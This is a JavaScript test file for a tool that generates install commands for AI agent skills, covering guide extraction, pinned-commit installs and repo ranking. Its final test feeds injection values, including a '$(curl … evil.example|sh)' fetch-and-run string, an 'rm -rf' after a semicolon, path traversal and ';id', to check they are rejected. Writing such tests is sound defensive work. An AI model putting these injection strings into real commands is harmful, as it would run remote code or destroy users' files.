import assert from 'node:assert/strict';
import test from 'node:test';
import { extractGuide, marketplaceCommands } from '../scripts/lib/guide.js';
import { skillFiles } from '../scripts/lib/skillparse.js';
import { buildInstall } from '../scripts/lib/install.js';
const SHA = 'a'.repeat(40);
import { pickRising } from '../scripts/lib/rising.js';

test('extractGuide copies install code blocks word for word and skips other sections', () => {
  const md = '# Tool\n\n## Features\n```\nignored\n```\n\n## Quick start\nRun **this** first:\n\n```bash\nnpx skills add a/b\n```\n\n## Contributing\n```\nnot this\n```\n';
  assert.deepEqual(extractGuide(md), [{ heading: 'Quick start', steps: [{ text: 'Run this first:', code: 'npx skills add a/b', lang: 'bash' }] }]);
  assert.deepEqual(extractGuide('no headings here'), []);
});

test('marketplaceCommands builds the two exact commands, or nothing for bad files', () => {
  const m = marketplaceCommands('o/r', JSON.stringify({ name: 'mk', plugins: [{ name: 'p1' }] }));
  assert.equal(m.add, '/plugin marketplace add o/r');
  assert.deepEqual(m.install, ['/plugin install p1@mk']);
  assert.equal(marketplaceCommands('o/r', '{nope'), null);
});

test('buildInstall pins the commit and gives Windsurf only the third-party installer', () => {
  const one = buildInstall({ full_name: 'o/r', sha: SHA, skills: [{ name: 'pdf', path: 'skills/pdf/SKILL.md' }] });
  const codes = one.install.claude.methods.map((x) => x.code);
  assert.ok(codes.some((c) => c.includes('checkout ' + SHA) && c.includes('cp -r skill-src/skills/pdf ~/.claude/skills/pdf')));
  assert.ok(codes.includes('gh skill install o/r pdf --agent claude-code --scope user --pin ' + SHA));
  assert.equal(one.install.windsurf.verified, false);
  assert.equal(one.install.windsurf.methods.length, 1);
  const root = buildInstall({ full_name: 'o/r', sha: SHA, skills: [{ name: 'r', path: 'SKILL.md' }, { name: 'x', path: 'x/SKILL.md' }] });
  assert.match(root.install.codex.methods.find((m) => m.title.startsWith('npx')).code, /--all$/);
  assert.match(root.install.codex.methods.at(-1).code, /rm -rf ~\/\.agents\/skills\/r\/\.git/);
});

test('pickRising skips famous, old and adult-named repos and ranks the fastest first', () => {
  const rule = { minStars: 50, maxStars: 5000, maxAgeDays: 120, count: 5 };
  const day = (n) => new Date(Date.parse('2026-11-11') - n * 864e5).toISOString();
  const repos = [
    { full_name: 'a/slow', stars: 300, created_at: day(100) },
    { full_name: 'a/fast', stars: 900, created_at: day(10) },
    { full_name: 'a/famous', stars: 90000, created_at: day(10) },
    { full_name: 'a/old', stars: 800, created_at: day(900) },
    { full_name: 'a/nsfw-pose', stars: 900, created_at: day(5) },
  ];
  assert.deepEqual(pickRising(repos, '2026-11-11', rule).map((r) => r.full_name), ['a/fast', 'a/slow']);
});

test('skillFiles counts files inside skill folders and flags scripts by extension', () => {
  const tree = [
    { path: 'skills/pdf/SKILL.md', type: 'blob' }, { path: 'skills/pdf/run.py', type: 'blob' }, { path: 'skills/pdf', type: 'tree' },
    { path: 'skills/other/notes.md', type: 'blob' }, { path: 'tools/build.sh', type: 'blob' },
  ];
  assert.deepEqual(skillFiles(tree, [{ name: 'pdf', path: 'skills/pdf/SKILL.md' }]), { total: 2, scripts: ['skills/pdf/run.py'], script_count: 1 });
});

test('buildInstall refuses hostile names so no shell command can carry them', () => {
  const bad = (skills, full_name = 'o/r', sha = SHA) => assert.throws(() => buildInstall({ full_name, sha, skills }));
  bad([{ name: '$(curl -s evil.example|sh)', path: 'skills/$(curl -s evil.example|sh)/SKILL.md' }]);
  bad([{ name: 'ok', path: 'x;rm -rf ~/ok/SKILL.md' }]);
  bad([{ name: 'has space', path: 'has space/SKILL.md' }]);
  bad([{ name: 'ok', path: '../ok/SKILL.md' }]);
  bad([{ name: 'ok', path: 'ok/SKILL.md' }], 'o/r;id');
  bad([{ name: 'ok', path: 'ok/SKILL.md' }], 'o/r', 'abc');
  assert.equal(marketplaceCommands('o/r', JSON.stringify({ name: 'mk', plugins: [{ name: 'p1;id' }] })), null);
});
